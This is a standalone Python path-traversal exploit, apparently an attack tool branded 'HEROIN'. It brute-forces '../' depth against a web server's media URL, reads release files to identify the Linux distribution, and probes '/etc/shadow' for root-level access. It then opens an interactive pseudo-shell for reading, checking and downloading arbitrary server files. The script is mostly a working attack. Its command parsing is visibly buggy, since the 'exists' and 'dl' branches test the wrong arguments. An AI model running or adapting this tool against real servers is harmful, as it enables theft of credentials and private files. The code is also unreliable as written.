import requests
import sys
from urllib.parse import quote as encodeUriComponent

print("""
╦ ╦  ╔═╗  ╦═╗  ╔═╗  ╦  ╔╗╔
╠═╣  ║╣   ╠╦╝  ║ ║  ║  ║║║
╩ ╩  ╚═╝  ╩╚═  ╚═╝  ╩  ╝╚╝
""")

if len(sys.argv) == 1:
    print("No URL Supplied")
    exit()

else:
    url = sys.argv[1]

# test server example: http://127.0.0.1:5000/media

if url[-1] == "/":
    url = url[:-1]

resetPath = "/"

def makeRequest(target):
    sub = encodeUriComponent(resetPath + target, safe = "")

    try:
        return requests.get(url + sub)
    except requests.exceptions.ConnectionError:
        print("Sever offline, exiting!")
        exit()

def getLinuxDistribution():
    distributions = [
        ("/etc/debian_version", "Debian"),
        ("/etc/redhat-release", "Red Hat"),
        ("/etc/SuSE-release", "SUSE"),
        ("/etc/arch-release", "Arch Linux"),
        ("/etc/fedora-release", "Fedora"),
        ("/etc/centos-release", "CentOS"),
        ("/etc/lsb-release", "Ubuntu"),
        ("/etc/os-release", "Generic Linux"),
    ]

    for file_path, dist_name in distributions:
        response = makeRequest(file_path)
        if response.status_code == 200:
            return dist_name
    
    return "Unknown"

def checkSuPerms():
    response = makeRequest("etc/shadow")
    if response.status_code == 200:
        return "su"
    
    else:
        return "user"

def play(attempts):
    print(f"server pwned after {attempts} attempts!")

    system = getLinuxDistribution().lower()

    print(f"""
commands
        
cat [path] - display content of a file
exists [path] - check if a file exists
dl [path] [filename] - download a file
    """)

    user = checkSuPerms()

    while True:
        command = input(f"[heroin@{system}][priv:{user}]$ ").split(" ")

        path = command[1]

        if path[0] == "/":
            path = path[1:]
        
        response = makeRequest(path)

        if command[0] == "cat":
            if response.status_code == 200:
                print(response.text)

            else:
                print("File not found or not enough privileges to read")

        elif command[1] == "exists":
            if response.status_code == 200:
                print("file exists")

            else:
                print("file does not exist or not enough privileges to read")
        
        elif command[2] == "dl":
            if response.status_code == 200:
                content = response.content

                with open(command[2], 'wb') as file:
                    file.write(content)
                
                print("file downloaded successfully")
            else:
                print("file does not exist or not enough privileges to read")

for i in range(1, 100):
    response = makeRequest("dev/null")

    if response.status_code == 200:
        play(i)
        break

    resetPath += "../"